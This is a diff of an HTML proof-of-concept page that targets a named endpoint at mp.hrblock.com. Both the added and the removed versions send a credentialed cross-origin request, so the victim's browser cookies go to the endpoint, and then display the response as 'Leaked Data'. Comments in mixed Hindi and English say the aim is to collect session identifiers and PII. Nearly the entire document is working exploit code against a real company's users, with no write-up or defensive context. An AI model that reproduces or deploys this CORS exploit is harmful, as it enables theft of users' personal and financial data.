@@ -1,48 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bulk CORS Scanner - H&R Block</title>
+    <title>CORS PoC Test</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background-color: #1a1a1a; color: #00ff00; }
-        .box { border: 1px solid #00ff00; padding: 15px; margin-bottom: 10px; background: #000; border-radius: 5px; }
-        .success { color: #00ff00; font-weight: bold; }
-        .failed { color: #ff0000; }
-        button { padding: 10px 20px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; }
+        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
+        #data { background: black; color: #00ff00; padding: 20px; border: 2px solid #333; margin-top: 20px; min-height: 50px; text-align: left; white-space: pre-wrap; word-wrap: break-word; }
+        button { background: #00ff00; color: black; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; }
+        button:active { background: #008800; }
     </style>
 </head>
 <body>
 
-    <h2>H&R Block - Bulk API Scanner (PoC)</h2>
-    <p>Testing for Sensitive Data Leakage across multiple endpoints...</p>
-    <button onclick="startScan()">Start Bulk Scan</button>
+    <h1>H&R Block Data Fetcher</h1>
+    <p>Target: mp.hrblock.com</p>
     
-    <div id="results"></div>
+    <button onclick="startExploit()">FETCH DATA NOW</button>
 
-<script>
-    function fetchSensitiveData() {
-        // Hum ab us endpoint ko target kar rahe hain jahan PII leakage ka risk hai
-        var target_url = "https://mp.hrblock.com/idl/hrb/idl";
-        var xhr = new XMLHttpRequest();
+    <div id="data">Waiting for action... (Click the button above)</div>
 
-        xhr.open("GET", target_url, true);
-        
-        // YE SABSE IMPORTANT LINE HAI:
-        // Isse browser victim ki cookies (CIAM, UCID) server ko bhejta hai
-        xhr.withCredentials = true; 
+    <script>
+        function startExploit() {
+            var display = document.getElementById("data");
+            display.innerHTML = "Fetching... Please wait.";
 
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                var response = JSON.parse(xhr.responseText);
-                
-                // Hum response mein specifically CIAM aur UCID dhoondh rahe hain
-                document.getElementById("data").innerHTML = "Leaked Data: " + JSON.stringify(response, null, 2);
-                
-                console.log("Full Leak:", response);
-            }
-        };
-        xhr.send();
-    }
-</script>
- 
+            var xhr = new XMLHttpRequest();
+            var target = "https://mp.hrblock.com/idl/hrb/idl";
+
+            xhr.open("GET", target, true);
+            
+            // Credentials (cookies) capture enable
+            xhr.withCredentials = true; 
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    if (xhr.status == 200) {
+                        // Success: Data screen par dikhao
+                        display.innerHTML = "SUCCESS! Leaked Data:\n\n" + xhr.responseText;
+                        console.log("Data:", xhr.responseText);
+                    } else {
+                        // Failure: Error dikhao
+                        display.innerHTML = "FAILED! Status: " + xhr.status + "\nCheck browser console for CORS error.";
+                    }
+                }
+            };
+            xhr.send();
+        }
+    </script>
 </body>
 </html>
